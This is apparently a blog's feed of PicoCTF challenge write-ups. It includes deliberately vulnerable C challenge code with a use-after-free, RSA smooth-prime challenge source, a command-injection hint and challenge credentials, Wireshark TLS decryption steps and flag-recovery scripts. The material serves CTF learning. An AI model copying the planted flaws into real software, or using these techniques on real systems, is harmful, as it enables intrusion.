&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	scanf(&lt;span style="color:#e6db74">&amp;#34; %c&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>response);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span>(toupper(response)&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Y&amp;#39;&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Bye!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(user);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Ok. Get premium membership please!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">printMenu&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;Welcome to my stream! ^W^&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;==========================&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;(S)ubscribe to my channel&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;(I)nquire about account deletion&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;(M)ake an Twixer account&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;(P)ay for premium membership&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;(l)eave a message(with or without logging in)&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;(e)xit&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">processInput&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scanf(&lt;span style="color:#e6db74">&amp;#34; %c&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>choice);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> choice &lt;span style="color:#f92672">=&lt;/span> toupper(choice);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span>(choice){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;S&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span>(user){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 		user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>whatToDo &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)s;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Not logged in!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;P&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>whatToDo &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)p;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;I&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>whatToDo &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)i;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;M&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>whatToDo &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)m;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;===========================&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Registration: Welcome to Twixer!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Enter your username: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>username &lt;span style="color:#f92672">=&lt;/span> getsline();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;L&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	leaveMessage();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;E&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Invalid option!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	exit(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	 &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setbuf(stdout, NULL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	user &lt;span style="color:#f92672">=&lt;/span> (cmd &lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#66d9ef">sizeof&lt;/span>(user));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">while&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printMenu();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		processInput();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#75715e">//if(user){
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>			doProcess(user);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#75715e">//}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Very Smooth</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---very-smooth/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---very-smooth/</guid><description>&lt;h1 id="picoctf---very-smooth">
 PicoCTF - Very Smooth
 &lt;a class="anchor" href="#picoctf---very-smooth">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/#p-1">$p-1$ Smooth&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">#!/usr/bin/python

from binascii import hexlify
from gmpy2 import *
import math
import os
import sys

if sys.version_info &amp;lt; (3, 9):
 math.gcd = gcd
 math.lcm = lcm

_DEBUG = False

FLAG = open(&amp;#39;flag.txt&amp;#39;).read().strip()
FLAG = mpz(hexlify(FLAG.encode()), 16)
SEED = mpz(hexlify(os.urandom(32)).decode(), 16)
STATE = random_state(SEED)

def get_prime(state, bits):
 return next_prime(mpz_urandomb(state, bits) | (1 &amp;lt;&amp;lt; (bits - 1)))

def get_smooth_prime(state, bits, smoothness=16):
 p = mpz(2)
 p_factors = [p]
 while p.bit_length() &amp;lt; bits - 2 * smoothness:
 factor = get_prime(state, smoothness)
 p_factors.append(factor)
 p *= factor

 bitcnt = (bits - p.bit_length()) // 2

 while True:
 prime1 = get_prime(state, bitcnt)
 prime2 = get_prime(state, bitcnt)
 tmpp = p * prime1 * prime2
 if tmpp.bit_length() &amp;lt; bits:
 bitcnt += 1
 continue
 if tmpp.bit_length() &amp;gt; bits:
 bitcnt -= 1
 continue
 if is_prime(tmpp + 1):
 p_factors.append(prime1)
 p_factors.append(prime2)
 p = tmpp + 1
 break

 p_factors.sort()

 return (p, p_factors)

e = 0x10001

while True:
 p, p_factors = get_smooth_prime(STATE, 1024, 16)
 if len(p_factors) != len(set(p_factors)):
 continue
 # Smoothness should be different or some might encounter issues.
 q, q_factors = get_smooth_prime(STATE, 1024, 17)
 if len(q_factors) != len(set(q_factors)):
 continue
 factors = p_factors + q_factors
 if e not in factors:
 break

if _DEBUG:
 import sys
 sys.stderr.write(f&amp;#39;p = {p.digits(16)}\n\n&amp;#39;)
 sys.stderr.write(f&amp;#39;p_factors = [\n&amp;#39;)
 for factor in p_factors:
 sys.stderr.write(f&amp;#39; {factor.digits(16)},\n&amp;#39;)
 sys.stderr.write(f&amp;#39;]\n\n&amp;#39;)

 sys.stderr.write(f&amp;#39;q = {q.digits(16)}\n\n&amp;#39;)
 sys.stderr.write(f&amp;#39;q_factors = [\n&amp;#39;)
 for factor in q_factors:
 sys.stderr.write(f&amp;#39; {factor.digits(16)},\n&amp;#39;)
 sys.stderr.write(f&amp;#39;]\n\n&amp;#39;)

n = p * q

m = math.lcm(p - 1, q - 1)
d = pow(e, -1, m)

c = pow(FLAG, e, n)

print(f&amp;#39;n = {n.digits(10)}&amp;#39;)
print(f&amp;#39;c = {c.digits(10)}&amp;#39;)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - VNE</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---vne/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---vne/</guid><description>&lt;h1 id="picoctf---vne">
 PicoCTF - VNE
 &lt;a class="anchor" href="#picoctf---vne">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>System Environment
Command Injection&lt;/p>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;p>We&amp;rsquo;ve got a binary that can list directories as root, try it out !! ssh to saturn.picoctf.net:53176, and run the binary named &amp;ldquo;bin&amp;rdquo; once connected. Login as ctf-player with the password, d137d16e&lt;/p>
&lt;ul>
&lt;li>Hint 1: Have you checked the content of the /root folder&lt;/li>
&lt;li>Hint 2: Find a way to add more instructions to the ls&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p></description></item><item><title>PicoCTF - WebNet0</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---webnet0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---webnet0/</guid><description>&lt;h1 id="picoctf---webnet0">
 PicoCTF - WebNet0
 &lt;a class="anchor" href="#picoctf---webnet0">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.csdn.net/walleva96/article/details/106844033">解密TLS協議全記錄之利用wireshark解密&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題其實就只是利用wireshark把訊息解密就這樣，所以看了一些文章後就按圖施工就好，解密完後就直接string search就找到了&lt;/p>
&lt;h2 id="exploit---tls-decrypt">
 Exploit - TLS Decrypt
 &lt;a class="anchor" href="#exploit---tls-decrypt">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>在&lt;code>Edit/Preferences/RSA Keys/&lt;/code>中&lt;code>Add new keyfile&lt;/code>
&lt;img src="https://hackmd.io/_uploads/ByMdwwSe6.png" alt="" />&lt;/li>
&lt;li>加入題目給的private key file後記得要重新開啟該pcap file
&lt;img src="https://hackmd.io/_uploads/S1PMPDSx6.png" alt="" />&lt;/li>
&lt;/ol></description></item><item><title>PicoCTF - WhitePages</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---whitepages/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---whitepages/</guid><description>&lt;h1 id="picoctf---whitepages">
 PicoCTF - WhitePages
 &lt;a class="anchor" href="#picoctf---whitepages">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/51?category=4&amp;amp;page=3">WhitePages&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source text&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-text!" data-lang="text!">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;h2 id="exploit---binary-encoding">
 Exploit - Binary Encoding
 &lt;a class="anchor" href="#exploit---binary-encoding">#&lt;/a>
&lt;/h2>
&lt;p>If you use sublime editor to observe the file, then you may see the result as below.
&lt;img src="https://i.imgur.com/ME4F3hm.png" alt="" />
In unicode, &lt;code>&amp;lt;0x2003&amp;gt;&lt;/code> is a kind of white space, then some gap between &lt;code>&amp;lt;0x2003&amp;gt;&lt;/code> is a normal white space. Obviously, this is a binary encoding(&lt;code>&amp;lt;0x2003&amp;gt;&lt;/code> is 0 and normal white space is 1)&lt;/p></description></item><item><title>PicoCTF - Who are you?</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---who-are-you_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---who-are-you_/</guid><description>&lt;h1 id="picoctf---who-are-you">
 PicoCTF - Who are you?
 &lt;a class="anchor" href="#picoctf---who-are-you">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h3 id="chrome-85-更新淺談-referer-policy-和更新影響">
 &lt;a href="https://www.maxlist.xyz/2020/08/03/chrome-85-referer-policy/">【Chrome 85 更新】淺談 Referer-Policy 和更新影響&lt;/a>
 &lt;a class="anchor" href="#chrome-85-%e6%9b%b4%e6%96%b0%e6%b7%ba%e8%ab%87-referer-policy-%e5%92%8c%e6%9b%b4%e6%96%b0%e5%bd%b1%e9%9f%bf">#&lt;/a>
&lt;/h3>
&lt;blockquote>
&lt;h3 id="http-referer-是什麼">
 HTTP Referer 是什麼?
 &lt;a class="anchor" href="#http-referer-%e6%98%af%e4%bb%80%e9%ba%bc">#&lt;/a>
&lt;/h3>
&lt;p>當使用者訪問網站時，會發送請求 (request) 給伺服器主機，而請求 header 中會有一個欄位是「referer」，而此欄位會存放當前請求來源的位置，也就是說請求的來源頁面。&lt;/p>
&lt;p>舉個例子：當小明從「iT邦幫忙」網站中點擊連結後，進入「Max 行銷誌」網站時，所發送的 request 請求 referer 就會是 &lt;a href="https://ithelp.ithome.com.tw/">https://ithelp.ithome.com.tw/&lt;/a> 的網址。&lt;/p>&lt;/blockquote>
&lt;h3 id="rfc-2616---date">
 &lt;a href="https://datatracker.ietf.org/doc/html/rfc2616#section-14.18">RFC 2616 - Date&lt;/a>
 &lt;a class="anchor" href="#rfc-2616---date">#&lt;/a>
&lt;/h3>
&lt;blockquote>
&lt;p>The Date general-header field represents the date and time at which
the message was originated, having the same semantics as orig-date in
RFC 822. The field value is an HTTP-date, as described in section
3.3.1; it MUST be sent in RFC 1123 [8]-date format.&lt;/p></description></item><item><title>PicoCTF - Wireshark twoo twooo two twoo...</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---wireshark-twoo-twooo-two-twoo_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---wireshark-twoo-twooo-two-twoo_/</guid><description>&lt;h1 id="picoctf---wireshark-twoo-twooo-two-twoo">
 PicoCTF - Wireshark twoo twooo two twoo&amp;hellip;
 &lt;a class="anchor" href="#picoctf---wireshark-twoo-twooo-two-twoo">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/110?category=4&amp;amp;page=1">Wireshark twoo twooo two twoo&amp;hellip;&lt;/a>&lt;/p>
&lt;h2 id="exploit---dns--sub-domain">
 Exploit - DNS + sub-domain
 &lt;a class="anchor" href="#exploit---dns--sub-domain">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Statistic
Using statistic to analyze http requests and you&amp;rsquo;ll see that there is &lt;code>/flag&lt;/code> and &lt;code>/&lt;/code> in address &lt;code>18.217.1.57&lt;/code>. Maybe it&amp;rsquo;s a clue or key to find flag
&lt;img src="https://i.imgur.com/VjobDhE.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>String search technique&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ strings shark2.pcapng | grep &amp;#34;pico&amp;#34;
picoCTF{bfe48e8500c454d647c55a4471985e776a07b26cba64526713f43758599aa98b}
picoCTF{bda69bdf8f570a9aaab0e4108a0fa5f64cb26ba7d2269bb63f68af5d98b98245}
picoCTF{fe83bcb6cfd43d3b79392f6a4232685f6ed4e7a789c2ce559cf3c1ab6adbe34b}
picoCTF{711d3893d90f100c15e10ef4842abeed3a830f8237c1257cd47389646da97810}
picoCTF{3cf1e22d489fcfb6bb312a34f46c8699989ed043406134331452d11ce73cd59e}
picoCTF{b4cc138bb0f7f9da7e35085e349555aa6d00bdca3b021c1fe8663c0a422ce0d7}
picoCTF{41b8a1a796bd8d202016f75bc5b38889e9ea06007e6b22fc856d380fb7573133}
...
&lt;/code>&lt;/pre>&lt;p>You&amp;rsquo;ll find tons of fake flag. Obviously, it&amp;rsquo;s a trap to distract you.&lt;/p></description></item><item><title>PicoCTF - Wizardlike</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---wizardlike/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---wizardlike/</guid><description>&lt;h1 id="picoctf---wizardlike">
 PicoCTF - Wizardlike
 &lt;a class="anchor" href="#picoctf---wizardlike">#&lt;/a>
&lt;/h1>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題蠻有趣的，如果只是單純執行程式碼，會發現是一個迷宮的遊戲，不過走越多會發現兩個現象&lt;/p>
&lt;ol>
&lt;li>遊戲本身根本無法破關&lt;/li>
&lt;li>有一些&amp;quot;道路&amp;quot;回隨著角色本身的移動慢慢浮現出來&lt;/li>
&lt;/ol>
&lt;p>我也不知道是哪來的想法直覺想要看他的地圖，因為看IDA翻出來的code，貌似有十個關卡，而如果把地圖翻出來會發現每一個關卡總共會有10000個字元，然後每一列都是100個字元呈現，然後就發現他其實是用地圖的方式呈現他的flag，則我們可以先把10個關卡的所有字元另存一個檔案(純手工)，再寫一點點script就可以把flag還原&lt;/p>
&lt;h2 id="exploit---通靈">
 Exploit - 通靈
 &lt;a class="anchor" href="#exploit---%e9%80%9a%e9%9d%88">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>f &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;./cipher.txt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pt &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;./flag.txt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;w&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join([f[&lt;span style="color:#ae81ff">100&lt;/span> &lt;span style="color:#f92672">*&lt;/span> i : &lt;span style="color:#ae81ff">100&lt;/span> &lt;span style="color:#f92672">*&lt;/span> i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>] &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(f) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>)])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pt&lt;span style="color:#f92672">.&lt;/span>write(flag)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::spoiler flag&lt;/p>
&lt;pre tabindex="0">&lt;code>######### 
#.......# ......#................................... 
#.......# ....................####.#####.#####..###. 
#........ .####.#..###..###..#.......#...#......#... 
#.......# .# #.#.#....# #.#.......#...###...#.... 
#.......# .####.#.#....# #.#.......#...#......#... 
#.......# .#....#..###..###...####...#...#......###. 
#.......# .#........................................ 
#.......# .......................................... 
#.......# 
#.......# 
#.......# 
#.......# 
#.......# 
#......&amp;gt;# 
######### 
#####. ............................................................. 
#.&amp;lt;.#. ...............#..#.............##.......#..#........#....... 
#...#. .#..#.###......#..#.......#...#..#.####..#..#.###....#....... 
#...#. .#..#.#........####.......#.#.#..#...#...####.#...####....... 
#...#. .####.#...####....#.#####..#.#..###.####....#.#...####.#####. 
 . ............................................................. 
 . ............................................................. 
 . ............................................................. 
#.... 
#...# 
#...# 
#...# 
#...# 
#...# 
#.&amp;gt;.# 
##### 
################# ....... 
#&amp;lt;..............#. ..###.. 
#...............#.. .#...#. 
#..............#......###.. 
#...#.......#...#.. .#...#. 
#..###.....###..#. ..###.. 
#...#...#...#...# ....... 
#......#&amp;gt;#......# ....... 
#...............# 
#...#.......#...# 
#..###.....###..# 
#...#.......#...# 
#...............# 
#...............# 
#...............# 
################# 
... .. ....... 
.&amp;lt;. ####. .#####. 
... ...#.. .#..... 
... ...#....###... 
 ..&amp;gt;#.. .#..... 
 ####. .#..... 
 .. ....... 
 ....... 
 
######################## 
#&amp;lt;.............#.......# 
#..............#.#...#.# 
#..............#.#...#.# 
#..............#.#####.# 
#..............#.....#.# 
#..............#.....#.# 
#..............#.......# 
#..............#.......# 
######################## 
....... 
.&amp;lt;..... 
....... 
....... 
....... 
....... 
....... 
....... 
....... 
....... 
....... 
.....&amp;gt;. 
....... 
####### 
....... 
.####.. 
.#...#. 
.####.. 
.#...#. 
.####.. 
....... 
....... 
... 
.&amp;lt;......... 
........... 
... .. 
 .. 
 .. 
 .. 
 .. 
 .. 
 .. 
 .............. 
 ..##########.. 
 .# #. 
 .# ....... #. 
 .# ..###.. #. 
 .# .#...#. #. 
 .# .#...#. #. 
 .# .#...#. #. 
 .# ..###.. #. 
 .# ....... #. 
 .# ....... #. 
 .# #. 
 ..##########.. 
 .............&amp;gt; 
######################### 
#&amp;lt;#......#.#.......###..# 
#.#.###..#.#.......##..## 
#.#.#.#..#.#.......#..### 
#.#.#.#..#.#.......#...## 
#...#....#..#......#....# 
#.######.##..###.###....# 
#.#.....................# 
#.###.#################.# 
#.......................# 
#########.###.#########.# 
#.......#.#.#.#.........# 
#.#...#.#.#...#.######### 
#.#...#.#.#.#.#.........# 
#.#####.#.#.#.#########.# 
#.....#.#.#.#.#.........# 
#.....#.#.#.#.#.######### 
#.......#.#.#.#.........# 
#.......#.#.#.#########.# 
